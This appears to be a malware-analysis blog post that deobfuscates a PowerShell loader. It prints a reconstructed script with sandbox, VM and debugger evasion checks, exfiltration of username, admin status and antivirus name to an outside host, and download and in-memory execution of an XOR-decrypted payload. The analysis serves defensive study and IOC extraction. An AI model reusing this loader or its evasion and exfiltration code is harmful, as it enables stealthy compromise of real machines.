---
layout: post
title: From Obfuscated Garbage to Clarity
date: 2025-07-15 15:00:00-0400
inline: false
related_posts: false
---

Recently, I came across a heavily obfuscated PowerShell script—the kind you’ll often see in real-world malware or red team payloads. In this post, I’ll walk you through the process I used to deobfuscate it: decoding strings, rebuilding logic, and finally revealing the script’s real intent. This guide is for analysts, pentesters, and anyone interested in malware reverse engineering.  
The script is sourced from the [ZHacker13/ReverseTCPShell](https://github.com/ZHacker13/ReverseTCPShell) repository and, at the time of writing, was still undetected by VirusTotal.
[VirusTotal](https://www.virustotal.com/gui/file/1339581bb26e157363b5b2ee044a6f97adfc672688915ad1ff01481ef4bfc382)

---

## 1. The First Glance: A Wall of Obfuscation

The original script looked like this:

```powershell

function DRLGJTjyWALFmvoywkxE{
    $gQNWEbnZTqqnpvELC = New-Object System.Reflection.AssemblyName($($("""$($((174,210,220,102,100)|%{[char]($_/2)})-join'')""")|iex));
    # ...tons more...
}

}
```

iterally every string and function name is randomized or hidden behind run-time decoding. Classic indicators:

- Math operations in arrays (e.g. [char]($_/2))
- Inline iex calls
- ong, random variable names

## 2. Decoding the Strings

Step one: Figure out what each encoded string represents. For example:

```powershell
$($((174,210,220,102,100)|%{[char]($_/2)})-join'')
```

Decode it manually (or with a quick helper script):

    [char](174/2) → [char]87 → W

    [char](210/2) → [char]105 → i

    [char](220/2) → [char]110 → n

    [char](102/2) → [char]51 → 3

    [char](100/2) → [char]50 → 2

I repeated this for all encoded sections. Many more common Windows API strings started appearing, like "MEMORYSTATUSEX", "kernel32.dll", "IsDebuggerPresent", etc.

## 3. Rebuilding Functions—Line by Line

After decoding the key strings, I started renaming the random variables and functions to match their real purpose. I worked through each function, identifying:

- Windows API calls (via P/Invoke)
- Environment/sandbox checks
- Memory and disk inspection
- Suspicious process detection

For example, the obfuscated check for system RAM:

```powershell
function BbkTfRaCBogtajfF{
    $snLCAOxRlXCgmRIZsovqwnstTKuOT = New-Object MEMORYSTATUSEX
    $snLCAOxRlXCgmRIZsovqwnstTKuOT.dwLength = 64
    if(![rOQcgNZuUHOSIIzxCh]::GlobalMemoryStatusEx([ref]$snLCAOxRlXCgmRIZsovqwnstTKuOT)) {return $false}
    $dAtFKjniAWeEaAqdw = [int]($snLCAOxRlXCgmRIZsovqwnstTKuOT.ullTotalPhys / 1024 / 1024)
    if($dAtFKjniAWeEaAqdw -lt 256) {return $true}
}
```

Check if system RAM is less than 256 MB—a common anti-sandbox trick.

## 4. Recognizing Anti-Analysis & Evasion Techniques

The next block of functions checked for things like:

- Running in a VM (QEMU, VMware, etc.)
- Presence of analysis tools (wireshark.exe, ollydbg.exe, etc.)
- Odd system properties or hostnames
- Low RAM or disk space (signs of a sandbox)

Example:
A function cycles through process names, looking for debuggers or VM tools and returns true if any are found.

## 5. Understanding the Main Flow

After unwrapping the helper functions, I reconstructed the main logic:

1.  Initial Checks: Only proceed if not in a VM/sandbox/debugger, etc.
2.  Data Exfiltration: Collect username and AV product info, encode, and send to a remote C2.
3.  Payload Download & Execution: - Download an encrypted payload - Decrypt with XOR (key often also obfuscated) - Execute payload in-memory via Invoke-Expression
4.  Error Handling: On errors, send diagnostics to another C2 URL.

## 6. Final: The Cleaned-Up Script

After going through every function, renaming variables, and pulling out hidden strings, I ended up with a clear, readable script. Here’s a simplified and annotated version:

```powershell
function IsLowRAM {
    $memStatus = New-Object MEMORYSTATUSEX
    $memStatus.dwLength = 64
    if (![Win32]::GlobalMemoryStatusEx([ref]$memStatus)) { return $false }
    $ramMB = [int]($memStatus.ullTotalPhys / 1024 / 1024)
    if ($ramMB -lt 256) { return $true }
}

function IsSandboxProcessRunning {
    $targets = @('ollydbg.exe', ...,'xenservice.exe')
    Get-WmiObject Win32_Process | ForEach-Object {
        if ($targets -contains $_.Name.ToLower()) { return $true }
    }
}
# ... more helper functions for anti-VM, etc.

function Main {
    $username = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $avName = ... # WMI query for AV
    if (<no evasion triggers>) {
        # Send exfil data
        # Download and run payload
    }
}
```

## 7. The Final Deofuscated Code

```powershell
function DRLGJTjyWALFmvoywkxE {
    # Register API structures and functions dynamically (MEMORYSTATUSEX etc.)
    $gQNWEbnZTqqnpvELC = New-Object System.Reflection.AssemblyName('Win32')
    $iweQbxkJaayjuNejyemUesBIc = [AppDomain]::CurrentDomain.DefineDynamicAssembly($gQNWEbnZTqqnpvELC, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $iweQbxkJaayjuNejyemUesBIc.DefineDynamicModule("Win32", $false)

    $MEMORYSTATUSEX_Type = $ModuleBuilder.DefineType(
        "MEMORYSTATUSEX",
        [System.Reflection.TypeAttributes]::Public -bor
        [System.Reflection.TypeAttributes]::Sealed -bor
        [System.Reflection.TypeAttributes]::SequentialLayout,
        [System.ValueType]
    )

    [void]$MEMORYSTATUSEX_Type.DefineField("dwLength", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$MEMORYSTATUSEX_Type.DefineField("dwMemoryLoad", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$MEMORYSTATUSEX_Type.DefineField("ullTotalPhys", [UInt64], [System.Reflection.FieldAttributes]::Public)
    [void]$MEMORYSTATUSEX_Type.DefineField("ullAvailPhys", [UInt64], [System.Reflection.FieldAttributes]::Public)
    [void]$MEMORYSTATUSEX_Type.DefineField("ullTotalPageFile", [UInt64], [System.Reflection.FieldAttributes]::Public)
    [void]$MEMORYSTATUSEX_Type.DefineField("ullAvailPageFile", [UInt64], [System.Reflection.FieldAttributes]::Public)
    [void]$MEMORYSTATUSEX_Type.DefineField("ullTotalVirtual", [UInt64], [System.Reflection.FieldAttributes]::Public)
    [void]$MEMORYSTATUSEX_Type.DefineField("ullAvailVirtual", [UInt64], [System.Reflection.FieldAttributes]::Public)
    [void]$MEMORYSTATUSEX_Type.DefineField("ullAvailExtendedVirtual", [UInt64], [System.Reflection.FieldAttributes]::Public)

    $MEMORYSTATUSEX_TypeObj = $MEMORYSTATUSEX_Type.CreateType()

    # Define Win32 API methods using P/Invoke
    $MEMORYSTATUSEX_Type = $ModuleBuilder.DefineType("rOQcgNZuUHOSIIzxCh", "Public, Class")
    $DllImportCtor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastErrorField = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")

    $IKShBKVmWEOGXMvFmV = New-Object Reflection.Emit.CustomAttributeBuilder(
        $DllImportCtor,
        @("kernel32.dll"),
        [Reflection.FieldInfo[]]@($SetLastErrorField),
        @($true)
    )

    $funcs = @(
        @{Name="GlobalMemoryStatusEx"; RetType=[bool]; ParamTypes=[Type[]]@([MEMORYSTATUSEX].MakeByRefType())},
        @{Name="GetTickCount64";      RetType=[UInt64]; ParamTypes=[Type[]]@()},
        @{Name="IsDebuggerPresent";    RetType=[bool]; ParamTypes=[Type[]]@()},
        @{Name="GetDiskFreeSpaceExA"; RetType=[bool]; ParamTypes=[Type[]]@([IntPtr],[UInt64].MakeByRefType(),[UInt64].MakeByRefType(),[UInt64].MakeByRefType())}
    )
    foreach ($f in $funcs) {
        $m = $MEMORYSTATUSEX_Type.DefinePInvokeMethod(
            $f.Name, "kernel32.dll",
            [Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static,
            [Reflection.CallingConventions]::Standard,
            $f.RetType, $f.ParamTypes,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        $m.SetCustomAttribute($IKShBKVmWEOGXMvFmV)
    }

    $MEMORYSTATUSEX_Type.CreateType() | Out-Null
}

function Is32BitOrOldWindows {
    return !${Env:ProgramFiles(x86)}
}
function IsDebuggerPresent {
    return [rOQcgNZuUHOSIIzxCh]::IsDebuggerPresent()
}
function IsRecentlyStarted {
    return ([rOQcgNZuUHOSIIzxCh]::GetTickCount64() -lt (1000 * 60 * 3))
}
function IsLowRAM {
    $memStatus = New-Object MEMORYSTATUSEX
    $memStatus.dwLength = 64
    if (![rOQcgNZuUHOSIIzxCh]::GlobalMemoryStatusEx([ref]$memStatus)) { return $false }
    $ramMB = [int]($memStatus.ullTotalPhys / 1024 / 1024)
    if ($ramMB -lt 256) { return $true }
}
function IsLowDisk {
    [UInt64]$totalBytes = 0
    if (![rOQcgNZuUHOSIIzxCh]::GetDiskFreeSpaceExA([IntPtr]::Zero,[ref]0,[ref]$totalBytes,[ref]0)) { return $false }
    $totalMB = [int]($totalBytes / 1024 / 1024)
    if ($totalMB -lt 10240) { return $true }
}
function IsSandboxProcessRunning {
    $targets = @(
        'ollydbg.exe','processhacker.exe','immunitydebugger.exe','wireshark.exe','dumpcap.exe',
        'hookexplorer.exe','petools.exe','lordpe.exe','proc_analyzer.exe','sysanalyzer.exe',
        'sniff_hit.exe','windbg.exe','joeboxcontrol.exe','joeboxserver.exe','resourcehacker.exe',
        'x32dbg.exe','x64dbg.exe','httpdebugger.exe','qemu-ga.exe','vboxservice.exe','vboxtray.exe',
        'vmsrvc.exe','vmusrvc.exe','vmtoolsd.exe','vmwaretray.exe','vmwareuser.exe',
        'vgauthservice.exe','vmacthlp.exe','xenservice.exe'
    )
    Get-WmiObject Win32_Process | ForEach-Object {
        if ($targets -contains $_.Name.ToLower()) { return $true }
    }
}
function IsSuspiciousHostname {
    $hostnames = @(
        "SANDBOX",
        "7SILVIA",
        "HANSPETER-PC",
        "JOHN-PC",
        "MUELLER-PC",
        "WIN7-TRAPS",
        "FORTINET",
        "TEQUILABOOMBOOM"
    )
    if ($hostnames -contains ([System.Net.Dns]::GetHostName()).ToUpper()) { return $true }
}
function IsVmVendor {
    $serial = (Get-WmiObject Win32_BIOS).SerialNumber
    if ($serial -eq 0) { return $true }
    $vendors = @("QEMU", "VIRTUALBOX", "VMWARE")
    $sysManu = ([string](Get-WmiObject Win32_ComputerSystem).Manufacturer).ToUpper()
    $sysModel = ([string](Get-WmiObject Win32_ComputerSystem).Model).ToUpper()
    $biosVer = ([string](Get-WmiObject Win32_BIOS).SMBIOSBIOSVersion).ToUpper()
    $boardManu = ([string](Get-WmiObject Win32_BaseBoard).Manufacturer).ToUpper()
    $boardProd = ([string](Get-WmiObject Win32_BaseBoard).Product).ToUpper()
    foreach ($v in $vendors) {
        if ($sysManu -match $v) { return $true }
        if ($sysModel -match $v) { return $true }
        if ($biosVer -match $v) { return $true }
        if ($boardManu -match $v) { return $true }
        if ($boardProd -match $v) { return $true }
    }
}
function IsCleanEnvironment {
    if (
        (Is32BitOrOldWindows) -or
        (IsDebuggerPresent) -or
        (IsRecentlyStarted) -or
        (IsLowRAM) -or
        (IsLowDisk) -or
        (IsSandboxProcessRunning) -or
        (IsSuspiciousHostname) -or
        (IsVmVendor)
    ) {
        return
    }
    Write-Output $true
}
function XorDecrypt {
    param ([byte[]]$data, [string]$key)
    while ($key.Length -lt $data.Length) {
        $key += $key.Substring(0, [math]::min($key.Length, $data.Length - $key.Length))
    }
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $result = [byte[]]::new($data.Length)
    for ($i = 0; $i -lt $data.Length; $i++) {
        $result[$i] = $data[$i] -bxor $keyBytes[$i]
    }
    return $result
}
function ExfiltrateAndLoadPayload {
    $username = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $encodedUser = [Uri]::EscapeUriString([Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($username)))
    try {
        DRLGJTjyWALFmvoywkxE
        $isAdmin = Get-WmiObject Win32_GroupUser |
            Where-Object {
                try { ($([wmi]$_.GroupComponent).SID -eq "S-1-5-32-544") } catch { $false }
            } |
            ForEach-Object {
                try { $([wmi]$_.PartComponent).Caption } catch { $null }
            } |
            Where-Object { $_ -eq $username }
        $isAdmin = ($isAdmin -ne $null)
        $avDisplayName = ""
        try {
            $avDisplayName = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct).DisplayName
        } catch {}
        $encodedAV = [Uri]::EscapeUriString([Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(($avDisplayName -join "")[0..200] -join "")))
        if ($username -and $isAdmin -and (IsCleanEnvironment)) {
            [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            $wc = New-Object System.Net.WebClient
            $url = "https://host5676.info:14755/b_${encodedUser}`_${encodedAV}"
            try { $wc.DownloadString($url) } catch {}
            $payloadUrl = "https://dlhost5676.info:14755/tt_b"
            try {
                $b64Payload = $wc.DownloadString($payloadUrl)
                $xorKey = "SomeKeyString"  # (Replace with actual key as decoded)
                $decryptedBytes = XorDecrypt ([Convert]::FromBase64String($b64Payload)) $xorKey
                $payloadCode = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
                Invoke-Expression $payloadCode
            } catch {}
        } else {
            $wc = New-Object System.Net.WebClient
            try {
                $fallbackUrl = "https://host5676.info:14755/fallback"
                $wc.DownloadString($fallbackUrl)
            } catch {}
        }
    }
    catch {
        $psVersion = $PSVersionTable.PSVersion
        $arch = [IntPtr]::Size * 8
        $msg = "$($psVersion.Major).$($psVersion.Minor).$arch:" + [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(($_ | Out-String)))
        $wc = New-Object System.Net.WebClient
        try {
            $errorUrl = "https://host5676.info:14755/error"
            $wc.DownloadString($errorUrl)
        } catch {}
    }
}

ExfiltrateAndLoadPayload
```

---

## 8. Key Takeaways & Lessons Learned

- **Obfuscation**: Most obfuscation in the wild is about hiding strings and function names. If you can decode them, you can reconstruct almost any script.
- **Scripting Automation**: For large scripts, use scripting to automate string decoding.
- **Anti-Analysis Tricks**: Memory, disk, hostname, and process checks are standard for evasion.
- **Pattern Recognition**: After a few of these, you’ll spot common obfuscation and evasion patterns immediately.
- **IOC Extraction**: Deobfuscation enables you to extract critical Indicators of Compromise (IOCs), such as:
  - C2 server domains/URLs (e.g., `host5676.info`, `dlhost5676.info`)
  - Unique payload URLs and exfiltration endpoints
  - Custom XOR keys and decryption methods
  - Hardcoded process or hostname lists used for evasion (can be YARA/IOC material)
- **Documentation**: Always document decoded strings, extracted endpoints, and unique behaviors for threat intelligence sharing.
- **Sharing**: Sharing IOCs and deobfuscated code with the community helps everyone defend faster.
- **YARA Detection**: There is a public YARA rule by Florian Roth (Nextron Systems) that reliably detects this obfuscation and reverse shell technique in the wild.
  - See: [HKTL_ReverseTCPShell_Dec19 (valhalla.nextron-systems.com)](https://valhalla.nextron-systems.com/info/rule/HKTL_ReverseTCPShell_Dec19)
